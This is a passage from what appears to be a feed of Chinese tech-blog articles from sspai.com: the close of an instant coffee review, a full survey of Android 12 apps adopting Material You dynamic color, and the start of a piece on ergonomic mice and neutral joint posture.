茶才应该是速溶饮料的归途——而速溶咖啡只能是不得已的解决方案。</p>\n<h2>最后</h2>\n<p>这篇文章立意明确——速溶咖啡评测，但在撰写过程中我花了很长时间思考它的形式。最开始我是想要写一篇理中客的速溶咖啡评测，结果发现根本做不到，首先我想要推荐的都不是销量这个客观数据最高的，其次当我邀请不同的朋友来尝试这些咖啡的时候，包括我在内每个人的喜好都是不尽相同的。所以我就放弃了，也放飞了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/10d364d9429f5e9790f69cc60db4a4ec.jpg\"><figcaption>它们真的就只是咖啡因</figcaption></figure><p>我没有逐一介绍，也未曾像网上大部分类似的文章一样预设评测标准然后打分排序，站明一个「奶咖爱好者」的立场后，我只推荐了我最喜欢的几款。至于还有几款甚至都没有提到的例如雀巢的「馆藏拿铁」和经常看到的「职人咖啡」，我只能说咖啡这玩意儿在大部分时候都是一分钱一分货了，当冻干敢卖到近三块钱一克的时候，你就想也别想那些一块乃至几毛钱的产品了，没有智商税，也没有尚未被挖掘的宝藏。</p>\n<p>最后再回到「移动咖啡馆」这个话题，我不知道你会不会觉得，咖啡是一种带情绪的饮料，就是你回想一下你每天的第一杯咖啡——可能是如都市丽人那般端着纸杯穿行在街头，可能是工位落座后第一口「鸡血」，也有可能像我这样「一天的开始」，当你习惯了咖啡后，你一定也会有固定喝咖啡的场景和时间，最后它就会变成一场私密的仪式、状态切换的旋钮和「只要我觉得」的快乐。</p>\n<p>所以移动咖啡馆的核心不在于「如何移动」，而是「咖啡常相伴」。我们总是需要一些一定要做但又意义泛泛的事儿，哪怕只是喝一杯咖啡，我希望无论是几毛钱的香精速溶还是数十更甚的精品鲜萃，保留这个习惯，并抓住一切机会去持续它。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69062"},{"title":"Android 平台的颜值标杆：Material You 应用大赏","date":"2021-10-06 07:00:00","description":"\n<p>如果说要罗列出 Android 12 最令人印象深刻的几大变化，Google 基于全新设计语言 Material You 为 Google Pixel 打造的这套新 UI 一定是其中之一。在 Pixel 设备所搭载的 Android 12 中，更换一张壁纸就能让整个系统 UI 焕然一新，从锁屏时间的字体颜色、启动器的图标、搜索框按钮，到通知中心、快速设置面板开关。甚至连摆在桌面的小部件（widget），都能通过适配 Android 12 的 <a href=\"https://developer.android.com/about/versions/12/features/widgets#dynamic-colors\" target=\"_blank\">应用动态颜色</a>，根据在桌面上的摆放位置呈现实时背景色效果。</p>\n<p>更重要的是，为了不让这套以壁纸取色为核心的个性化定制系统仅仅停留在 Android 系统表面，Google 在努力用 Pixel 机型「打样」的同时，也积极推动着 Material You 在自家应用中的适配。在 Android 12 正式版源码提交至 AOSP 之际，我们为大家整理了目前（截至 2021 年 10 月 6 日）已经适配了 Material You 设计的 Android 应用。</p>\n<h2>Google 应用</h2>\n<h3>基础通讯三件套</h3>\n<p>虽然是智能手机的「基础设施」，Google 自家的电话、通讯录和短信应用跟进 Material You 的速度却并不算快，适配程度也可以说是参差不齐。</p>\n<p>通讯录中，搜索框、<a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#add_a_navigation_drawer\" target=\"_blank\">左侧抽屉式导航</a>、右上角视图过滤菜单、应用设置的标题栏等区域都会采用从桌面壁纸提取到的配色作为点缀，Material Design 标志性的 <a href=\"https://developer.android.com/guide/topics/ui/floating-action-button?hl=zh-cn\" target=\"_blank\">悬浮操作按钮</a>（FAB）在应用动态颜色的同时，形状也从以往的圆形变成了圆角矩形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2db34teh5fkvn80.png\"></figure><p>而在拨号应用中，拨号键盘收起时右下角的悬浮操作按钮也用上了同样风格的圆角矩形按钮，不同层级悬浮操作按钮也用不同的动态颜色进行了视觉区分；除了同样应用于搜索框背景、高亮选中背景、设置界面背景等区域的动态配色外，拨号应用的 <a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#bottom_navigation\" target=\"_blank\">底部导航栏</a> 也通过采用不同动态颜色的图标和背景，营造出了更有层次感的底部导航栏设计。</p>\n<p>作为 Google 自家规范适配一直以来的「盲区」<sup class=\"ss-footnote\" href=\"\" title=\"虽然 Google 从 Pixel 3 XL 开始就有搭载异形屏的硬件存在了，但 Google 拨号应用的通话界面至今没有支持刘海屏。\" footnote-id=\"1\">1</sup>，拨号应用连最为基础的<strong> </strong><a href=\"https://sspai.com/post/65930#:~:text=%E8%87%AA%E9%80%82%E5%BA%94%E5%9B%BE%E6%A0%87-,%E6%9B%B4%E9%80%82%E5%90%88%E5%85%A8%E9%9D%A2%E5%B1%8F%E7%9A%84%E5%BA%94%E7%94%A8%E8%AE%BE%E8%AE%A1,-%E4%BB%8E%E6%9C%BA%E6%A2%B0%E5%BC%8F\" target=\"_blank\">边到边</a><strong> </strong>适配都没有，浅色主题下顶部状态栏和底部导航栏背景始终为白色，视觉效果令人感到不适。但这里的底部导航栏新样式，和上面提到的动态颜色、圆角矩形悬浮操作按钮一起，构成了 Google 自家应用 Material You 的核心风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2lb34teh0gc1nrg.png\"></figure><p>至于信息应用，截至发稿时，Google 仅对应用主界面右下角的悬浮操作按钮进行了更新，同样是由圆变方，在信息列表中滚动浏览时，悬浮操作按钮会根据滑动方向在扩展形态和精简形态间切换；设置项目得到了重新整理，更加清晰明了。但除此之外信息应用的更新就可以说是乏善可陈了，我们甚至看不到半点动态颜色的影子，无论桌面壁纸如何，应用内均采用蓝色为默认颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2tb34teh3cl8vo0.png\"></figure><h3>日历</h3>\n<p>同样作为基础应用的 Google 日历在 Material You 适配上做得出色得多：从桌面提取到的动态颜色从主界面、设置标题栏，主、次悬浮操作按钮一直延伸到左侧抽屉式导航和设置，日程视图中的当前日期标记、活动卡片（默认样式）等控件，也都采用了不同取值的动态颜色进行点缀，看上去和谐又不失变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3db34teh3cl8vog.png\"></figure><p>更重要的是，Google 日历在桌面小组件中也同样运用了 Material You 动态颜色，视桌面摆放位置的不同，小部件标题栏的颜色也会动态改变。总体来说日历应用算是将新设计诠释得比较到位的适配案例之一。</p>\n<h3>Chrome</h3>\n<p>Chrome 在功能和设计上一直以来都可以说是保守而谨慎，在升级到 Chrome 94 及以上版本后，使用 Android 12 的用户应该也看到一些新变化<sup class=\"ss-footnote\" href=\"\" title=\"如果你没有看到，也可以通过 chrome://flags 中开启 #dynamic-color-android 和 #theme-refactor-android 两项开关来手动激活\" footnote-id=\"2\">2</sup>：主界面的搜索框、地址栏和快速访问标签，浏览网站时的标题栏，多标签页管理界面的标签页边框等界面都通过提取并适配了不同的动态颜色，多标签页管理页面的标签页卡片也采用了更加圆润的圆角设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3lb34teh3cl8vp0.png\"><figcaption>Chrome 94.0.4606.50 开启上述功能标签后的效果</figcaption></figure><p>除此之外 Chrome 浏览器几乎就没做太多设计上的适配了，连浏览器设置界面都还是老样子。</p>\n<h3>计算器</h3>\n<p>随 Android 12 Beta 5 搭载的新版计算器正式采用了 Material You 设计风格，这款系统小工具的视觉观感也因此得到了巨大的提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp45b34teit0pn4i0.png\"></figure><p>首先是颜色，通过不同的动态颜色取值，计算器不同区域、不同按键之间在保留层次感的同时也有了对系统整体色彩风格的呼应，如果你将 Android 12 动态颜色的彩蛋小部件添加到桌面并完全展开，会发现计算器主界面基本都是提取的 N1、N2 和 A1、A2 相近色列，全部清除（AC）这种需要谨慎操作的按钮则直接取到了 A3 列进行强调。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp4tb34teh3cl8vpg.png\"></figure><p>除了颜色，计算器按钮由方变圆，计算结果、计算历史区域也通过柔和的圆角边缘和相近色取值进行了区分。</p>\n<h3>时钟</h3>\n<p>在 Android 12 Beta 5 中随计算器一起加入 Material You 套餐的还有时钟应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp55b34teh5fkvn8g.png\"></figure><p>虽然时钟应用依然默认采用深色主题且不可更改，但应用内 Material You 适配全面，除了开关、按钮、底部导航图标和选中时的强调背景等区域大量提取、运用了动态颜色外，闹钟在关闭、激活状态下的字重变化，圆角卡片以及大色块圆形按钮的堆叠，都给人以强烈的视觉新鲜感。</p>\n<p>另外时钟小组件也同步迎来了更新，除了 3 款不同样式的数字时钟外，此前在 Android 12 亮相视频中圈粉无数的多边形模拟时钟也包含在内，这些组件放置在桌面时依然可以根据摆放位置的不同动态变换颜色。</p>\n<h3>文件极客</h3>\n<p>虽然从设计规则上来说文件极客可以说是 Google 自家应用中「打脸」一般的存在<sup class=\"ss-footnote\" href=\"\" title=\"因为在 Material Design 的 设计规范 中明确指出少于 3 个标签页面时不要使用底部导航栏设计。\" footnote-id=\"3\">3</sup>，但这款应用依然跟随 Android 12 进行了 Material You 动态颜色的提取和应用，包括主界面的清理操作按钮、文件浏览界面的弹出菜单、底部导航栏的导航图标和导航图标选中背景等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp5lb34teh3cl8vq0.png\"></figure><p>不过整体而言文件极客的 Material You 设计适配依然可以用「破碎」二字来形容，除了对 Material Design 设计规范本身的不尊重，应用内还存在着大量跨越多个世代的「糅合」设计，不管是带有阴影的圆角矩形卡片、底部导航栏和右侧快速索引标签还是依然采用 Roboto 而不是 Google Sans 字体的文件浏览菜单，整体视觉风格都给人一种仍在换皮、依然不得 Material Design 精髓的感觉。</p>\n<h3>Google 播客</h3>\n<p>作为 Google 第一方的播客应用，Google 播客也在最近的版本中跟进了 Material You 设计风格，通过大面积应用的动态颜色提升应用与系统界面在视觉观感上的一致性。同时也用上了标志性的新式底部导航栏设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp65b34teh3cl8vqg.png\"></figure><p>不过除了动态色彩和新版底部导航栏，Google 播客应用和拨号应用一样也因为底部导航栏「变色」暴露出了没有适配边到边的问题，纯白的导航栏背景看上去具有非常明显的割裂感。另外作为 Google 的第一方播放器应用，我们也期待 Google 接下来能够拿出更多 Material You 播放器设计巧思——比如那个出现在 <a href=\"https://www.youtube.com/watch?v=UHQPdP8qgrk\" target=\"_blank\">宣传视频 </a>中、却至今没有任何 app 实装的波浪形进度条。</p>\n<h3>Google 相册</h3>\n<p>和上面提到的日历应用类似，Google 相册也可以说是 Material You 适配得比较到位的 Google 应用之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp6db34teh5fkvn90.png\"></figure><p>除了大量运用的动态颜色、全新样式的底部导航标签外，Google 相册主界面此前已经大量采用的圆角和卡片设计也为其增色不少，应用中的按钮、搜索框等控件也通过相近取色而非阴影的方法来体现层级，浏览相册时，时间分隔文本也采用了类似 Android 12 系统设置那样的大字体标题，兼具视觉效果和分隔效果。</p>\n<h3>相机、Google Lens</h3>\n<p>相机应用在 Android 系统中虽然是功能大于设计的存在，但 Material You 的动态颜色依然在其中起到了不俗的点缀效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp7db34teh0gc1ns0.png\"></figure><p>在 Android 12 中，相机取景器底部选中的当前拍摄模式会通过采用动态颜色的标签背景进行提示，取景器中的变焦按钮、安全相册开关以及顶部设置面板也都使用了统一提取到的动态颜色来呈现选中效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp85b34teh3cl8vr0.png\"></figure><p>与相机应用类似的，Google Lens 也已部分采用了 Material You 设计，比如取景框中的取字翻译提示。但底部功能标签依然没有跟进动态颜色适配。</p>\n<h3>Google Workspace</h3>\n<p>虽然依然保留了左侧导航抽屉，Google Drive 在可以的地方几乎都用上了从桌面壁纸提取到的动态颜色，导航栏、背景、底部弹出菜单、搜索框等不同界面的层级也通过相近色的变化体现了出来，新版底部导航栏设计和支持动态颜色的桌面小部件自然也没有缺席。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8db34teh3cl8vrg.png\"></figure><p>Google Workspace 套件中的其它应用，如 Gmail、文档、表格、幻灯片等，也拥有了较为完整的 Material You 适配，大面积应用的动态颜色、圆角矩形样式的悬浮操作按钮一个不少，Gmail 同时还拥有全新的「四叶草」式动态色彩小部件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/64817c38c30ec50b70f1d2c4a4475d4c.jpg\"></figure><p>有意思的是 Gmail 应该也是目前唯一一款对 Material You 底部导航栏设计有着不同想法的 Google 应用。如果你在设置中开启了聊天室、Chat 等底部导航标签页面，就会发现 Gmail 的底部导航栏高度相比其它 Google 应用要更矮一点。显然 Gmail 团队认为新版底部导航栏虽然观感上视觉一新了，但屏幕利用率还可以再稍微提高一点。</p>\n<h3>Keep 笔记</h3>\n<p>Keep 笔记对 Material You 的适配主要集中在配色和小部件上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8tb34teh3cl8vs0.jpeg\"></figure><p>应用内部，搜索框、底部操作栏和底部操作栏上的悬浮操作按钮都换上了新样式和动态颜色，主界面背景和笔记卡片上的标签，则以更浅或更深的相近取色来突出层级，美中不足的是底部操作栏上的圆角矩形悬浮操作按钮采用了阴影而非不同取色的方法来进行强调。</p>\n<p>Google Keep 也提供了新版「四叶草」小部件，可根据摆放位置自动变换颜色。</p>\n<h3>Gboard</h3>\n<p>越是明显的地方似乎就越容易被忽略，一开始我们甚至忘了将 Gboard 加进这篇文章的提纲里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp95b34teh0gc1nsg.png\"></figure><p>在 Android 12 中，Gboard 提供了新的动态颜色主题方案，开启后键盘背景、按键都会采用从壁纸提取到的颜色进行点缀。</p>\n<p>Gboard 虽小，却最能体现 Material You 的核心设计理念：根据功能和场景灵活运用不同的几何形状、用色彩对关键操作和按键区域进行强调、用色差体现层级同时尽量避免使用阴影……它应该也算是 Google 应用 Material You 设计的优秀代表之一了。</p>\n<h2>第三方应用</h2>\n<h3>Sleep as Android</h3>\n<p>Sleep as Android 是一款比较老牌的睡眠追踪应用，在版本号为 20210910 的测试版中，Sleep as Android 正式适配了 Material You 的动态颜色系统，配合主界面内大量使用的圆角矩形卡片、扩展式悬浮操作按钮以及条理清晰、层次分明的界面与设置项目，我们在 Sleep as Android 完全看不到任何「老牌」的味道。扑面而来的都是新设计的香气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp9db34teh3cl8vsg.png\"></figure><span class=\"ss-application\" app-id=\"14361\"> </span><h3>Tasker</h3>\n<p>同样老牌的 Tasker 近年来在 Android 新特性适配这件事情上也非常积极。最新版 Tasker 依然保留着大量「牛轧糖」时代的味道，但主界面配色方案却跟进了 Material You。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp9tb34teh5fkvn9g.png\"></figure><p>唯一要吐槽的是 Tasker 在动态颜色选取上似乎有些跳脱，同样一张壁纸，Sleep as Android 采用配色方案明显要比 Takser 好看得多。这其实也反映出了一个问题：Material You 提取到的色彩只是第一步，能否合理使用这些提取到的颜色来为应用颜值加分，还得看应用开发者的实际理解。</p>\n<span class=\"ss-application\" app-id=\"1772\"> </span><h3>DarQ</h3>\n<p>DarQ 是一款借助 root 权限、为不支持深色主题的应用（比如 Handshaker ）强行开启深色界面的小工具。 在 6 月末的 <a href=\"https://github.com/KieronQuinn/DarQ/releases/tag/2.0\" target=\"_blank\">2.0 版本</a> 中，DarQ 就已经加入了对 Material You 色彩系统的支持，经过 7 月初 2.1 版本的小修小补之后，目前它在 Android 12 上的使用体验已经相当完善。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpa5b34teit0pn4ig.png\"></figure><p>值得一提的是 DarQ 作为一款工具应用，在应用设置的设计上也尽量向 Android 12 的系统设置看齐，顶部标题栏采用了大面积的留白、功能总开关也与系统设置的新样式保持一致，最大程度消弭了第三方工具与系统设置在视觉上的差异。</p>\n<h3>Inware</h3>\n<p>Inware 是一款类似 AIDA64 的系统信息检测工具，与 AIDA64 繁冗的设计相比， Inware 的 UI 更加现代一些，用一部分信息量的牺牲换取了更好的易读性。</p>\n<p>在最新的 Inware 测试版中，进入主界面右上角的软件设置，在外观菜单中便可以找到一个名为 Use system colors 的开关，将它打开之后就可以让 Inware 的配色方案与系统壁纸匹配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpalb34teh5fkvna0.png\"></figure><span class=\"ss-application\" app-id=\"16179\"> </span><h3>质感文件</h3>\n<p>与前文提到的文件极客不同，来自第三方开发者的质感文件一直以来都维持着标准化的 Material Design 风格设计。因此质感文件也是首批适配了 Material You 动态颜色的第三方应用之一，只需在应用设置中开启相关开关，即可解锁完全不同于预置主题方案的全新配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpatb34teh5fkvnag.png\"></figure><p>不过质感文件除了色彩方案的适配外目前倒是没有太多界面元素和控件上的翻新，这里不妨也期待以下这款小工具的后续更新。</p>\n<span class=\"ss-application\" app-id=\"16180\"> </span><h3>Swift Walls</h3>\n<p>Android 平台上的第三方壁纸 app 不胜枚举，但像 Swift Walls 这种同时对壁纸浏览、设置和编辑体验都同样重视的壁纸应用并不算多。Swift Walls 在最新版本中不仅适配了 Material You 的动态颜色，还大量采用了符合 Material Design 设计规范的界面控件，应用设置也向 Android 12 系统设置的整体风格看齐，视觉观感和使用体验都很不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpb5b34teit0pn4j0.png\"></figure><span class=\"ss-application\" app-id=\"15169\"> </span><h3>Infinity for Reddit</h3>\n<p>与 Twitter 和微博类似，社交网站 Reddit 同样通过开放相关接口的方式，为样式繁多的第三方客户端提供了展示技术和审美的机会。这其中就包括 Infinity for Reddit（下称 Infinity）。</p>\n<p>相比 Reddit 官方客户端，Infinity 在没有对主要功能布局进行改动的基础上为 app 添加了许多 Material Design 设计的风味——从 Material Design 2 时代风格的底部操作栏与居中悬浮操作按钮，到 5.0.4 版本中引入的 Material You 动态配色方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpblb34teit0pn4jg.png\"></figure><p>不过 Infinity 也存在和 Tasker 类似的问题，手动开启 Material You theme 开关后，它会将系统色表中几个饱和度比较高的关键色用作顶栏、底栏和信息卡片的默认背景色，看上去有些「用力过猛」了。不过 Infinity 本身也为这个问题提供了一套相当成熟的解决方案：在启用 Material You 主题开关之后，我们仍然可以手动对应用内几乎每一处颜色进行修改。</p>\n<span class=\"ss-application\" app-id=\"16181\"> </span><h3>Todoist</h3>\n<p>Google 第一方待办应用 Google Tasks 在更换新图标之余似乎没有跟进 Material You 的迹象，多次荣登少数派首页的知名 GTD 应用 Todoist 则趁机弯道超车，在 v8602 版本中为用户带来了 Material You 动态颜色支持。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpc5b34teh3cl8vt0.png\"></figure><p>值得肯定的是，Todoist 的动态主题色选项也没有放进订阅解锁区域当中，免费版用户在安装最新测试版本后也能进入设置菜单手动打开；不过目前 Todoist 的动态配色方案还没来得及适配深色主题，也无法跨平台同步到其它设备上。</p>\n<span class=\"ss-application\" app-id=\"9874\"> </span><h3>通知滤盒</h3>\n<p>通知滤盒也是少数派首页的「常客」。作为一款系统通知管理软件，它可以从另外一个角度解决垃圾短信的问题——既然收到垃圾短信是很难避免的，那么不让它们弹通知出来烦人便也曲线救国实现了「管理」的目标。</p>\n<p>在最近更新的通知滤盒 v2.1.1 中，开发者为其接入了 Material You 动态配色方案，甚至应用右下角的悬浮操作按钮也如 Google 应用一样改成了圆角矩形样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpclb34teh3cl8vtg.png\"></figure><span class=\"ss-application\" app-id=\"15141\"> </span><h3>Tachiyomi</h3>\n<p>作为一款免费、开源的 Android 漫画阅读器，<a href=\"https://tachiyomi.org/\" target=\"_blank\">Tachiyomi</a> 一直以来也是 Material Design 的忠实追随者，其众多 <a href=\"https://tachiyomi.org/forks\" target=\"_blank\">分支</a> 也可以说是百花齐放，体现着不同开发者对于 Tachiyomi 在功能和设计上的不同理解。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpctb34teit0pn4k0.png\"></figure><p>目前 Tachiyimi 已经支持了 Material You 动态配色方案，一些优秀分支，比如 <a href=\"https://tachiyomi.org/forks/#tachiyomij2k\" target=\"_blank\">TachiyomiJ2K</a> 更是适配了 Android 12 的 SplashScreen API，拥有惊艳的开屏动画效果。</p>\n<h2>小结</h2>\n<p>在 Google Pixel 的体验中，Material You 仅仅只是 Google 为 Android 12 所设计的视觉和交互体验的一部分：以 Pixel Launcher 为出发点，Google 应用可以根据桌面壁纸套用不同色彩风格的桌面图标；从点击图标启动应用到进入应用完成主界面加载这段时间内，系统会调用 <a href=\"https://developer.android.com/reference/android/window/SplashScreen\" target=\"_blank\">SplashScreen API</a> 带来舒适、自然的闪屏动画效果；进入应用后，基于 Material You 动态色彩的设计则会将壁纸和启动器中那种熟悉的视觉观感延续到应用内部。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpe5b34teh0gc1nt0.gif\"><figcaption>从桌面图标到应用内的效果</figcaption></figure><p>回顾 Material Design 从发展至今的历程，可以说今年应该是新设计语言在 Android 平台适配速度最快、覆盖面最广的一年。借由形状、色彩和动画都更加活泼多变的 Material You，Google 也将此前宣传的 <a href=\"https://material.io/design/material-theming/overview.html#material-theming\" target=\"_blank\">Material Theming</a>（借助 Material Design 打造品牌辨识度）推向了一个新的高度。至少在今年晚些时候正式开源之前，看见类似本文出现的截图时我们都会马上反应过来——这是 Material You，这是 Google 为 Pixel 系列机型打造的 Android 12 视觉体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpedb34teh3cl8vug.gif\"><figcaption>Material Theming | 图：Google</figcaption></figure><p>不过目前我们看到的这套 Material You 适配方案也暴露出了一些问题。</p>\n<p>从设计上来说，Material You 在 Google 自家应用中的一些细节依然存在冲突，比如 Android 12 锁屏 PIN 码的大色块圆钮会在按下时变为圆角矩形，但同样采用大色块圆钮设计的计算器却没有采用这种反馈动画，再比如不同 Google 应用的适配程度依然参差不齐，Gmail 团队显然也对 Material You 底栏设计有着不同的看法，在后续更新的版本中对默认的底栏高度进行了微调。</p>\n<p>好消息是，虽然这套基于壁纸的取色系统最快也要等到 <a href=\"https://www.xda-developers.com/android-12-1-monet-open-source/\" target=\"_blank\">Android 12.1</a> 才会开源，在此之前 OPPO、三星等厂商也已经跟随 Android 12 进行了底层适配，但在最近放出的 One UI 4 Beta 版本中，三星已经开始回应 Google 的设计思路了（<a href=\"https://www.xda-developers.com/samsung-one-ui-4-beta-2-android-12-galaxy-s21/\" target=\"_blank\">来源</a>）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/article/bf4cbaf7584a1c7fbda65173bed2f2ff\" alt=\"One UI 4 beta 2 color theme\"><figcaption>One UI 4 中的 Material You 动态色彩适配 | 图：XDA</figcaption></figure><p>你如何看待 Material You 和现有 Google 应用中的 Material You 设计，还有哪些适配了 Material You 的好应用本文没有提到？欢迎在评论区留下你的看法。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69117"},{"title":"它或许能拯救你酸痛的手臂：浅谈人体工学鼠标","date":"2021-10-06 03:00:00","description":"\n<p>此前我曾经写过一篇介绍 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a> 的文章，而本文的主角——人体工学鼠标——与它一样，是为了减少使用者手部疲劳、延缓劳损发生而设计的。</p>\n<p>如果你了解鼠标的起源，应该就会对下图中那个靠双滚轮活动的方盒子有点印象。这是 Douglas Engelbart 在 1968 年发明的第一款「鼠标」，原本叫做「显示系统的 X-Y 座标指示器」，它代表了人机交互领域的一次全新尝试，也开启了一个全新的时代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2g5b34teh5fkvc5g.png\"></figure><p>而后续的鼠标制造商，也或多或少地承袭这样的设计理念。在最初的几年里，机械鼠标基本维持这样方盒子的形态。随着使用的增多，使用者和厂商才意识到流线型的重要性，给鼠标套上了不同的外壳，逐渐演变成我们目前能见到的，最为基本的对称、曲线、左右主按键的设计。</p>\n<p>这样的设计其实是有隐患的。要想说清楚这一点，我们需要使用鼠标时，你胳膊的状态说起。</p>\n<h2>什么姿势对手臂最友好？</h2>\n<p>每一个关节都有自己适当的活动方向，每种活动也有一定的活动范围（活动度）。比如肩关节，作为人体最灵活的关节，它可以完成屈、伸、收、展、旋转和环转六类基本运动，六类运动组合形成日常生活中我们需要的各种复杂运动；当肩关节的外展时，最大可达 180°，而让肩关节后伸，最大就只有 60°。<sup class=\"ss-footnote\" href=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" title=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" footnote-id=\"1\">1</sup></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2gdb34teh5fkvc60.png\"><figcaption>从左至右：前屈、后伸、外展与内收、内旋、外旋，图源：sequencewiz.com</figcaption></figure><p>由于这种活动限制的存在，我们生活中需要进行的各种动作往往需要动用多个关节，而相应地，同一个动作，经常也可以靠不同的关节活动达成。拿「移动鼠标」这件事来说，你可以固定肩膀、肘部，仅靠手腕或手指完成活动；也可以减少手腕和手指的活动，选择手肘或是肩膀运动来带动鼠标。借用游戏玩家的术语，这就是常说的所谓的「<strong>手腕流</strong>」和「<strong>手臂流</strong>」。与此相关的，还有一个很著名的论点：</p>\n<blockquote><p>（FPS）职业选手手臂流居多。</p></blockquote>\n<p>职业游戏玩家可以视作极端化的一般办公室人群，他们使用鼠标更加频繁、幅度更大、更需要长时间、高精准度的操作。而当谈及采用手臂流的原因时，讨论大多就指向了「精准度」——由于手指和手腕的活动范围较小，玩家不得不把灵敏度提高以进行大角度转向，这样手部的小幅震颤也会加倍地体现在准星上；相应地，手臂流玩家就可以采用更大的活动幅度以及更低的灵敏度。</p>\n<p>但职业选手之所以采用「手臂流」，或者说用肘关节和肩关节完成大幅度移动，除去个人习惯的偏好外，还有一部分原因和手部健康脱不开干系。</p>\n<p>在此，我需要引入一个概念：「<strong>中立位</strong>（neutral position）」。</p>\n<p>所谓中立位，指的是每个关节的静止位置。当关节相关的神经、肌腱、肌肉和骨骼都处在最小张力或压力状态下时，关节自然处在的默认位置即为「中立位」。<sup class=\"ss-footnote\" href=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" title=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" footnote-id=\"2\">2</sup> 这种状态下的肌肉可以最有效地发力，关节在这一位置造成的磨损也最小。</p>\n<p>上世纪 80 年代前，NASA 在 Skylab 上完成了对 12 名宇航员在微重力环境下完全放松的自然姿势的测量，这为后续人体工学设备的设计提供了重要依据。这一姿势被称作<strong>中立体态</strong>（Neutral Body Posture，NBP）。当然，在重力环境下，我们的具体数值可能略有不同，比如肘关节的屈曲范围可达 0~135°/150°，但中立位在 90°~110° 之间。但上肢部分的姿态基本一致：上臂略展，肘关节屈曲，手部中线与前臂中线同轴，手指自然弯曲。后续各种人体工学设备的设计思路也基本都遵循了维持中立体态的原则，包括此前讨论过的 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2glb34teh3cl8k60.png\"><figcaption>图源：<a href=\"https://spinoff.nasa.gov/Spinoff2013/t_4.html\" target=\"_blank\">NASA 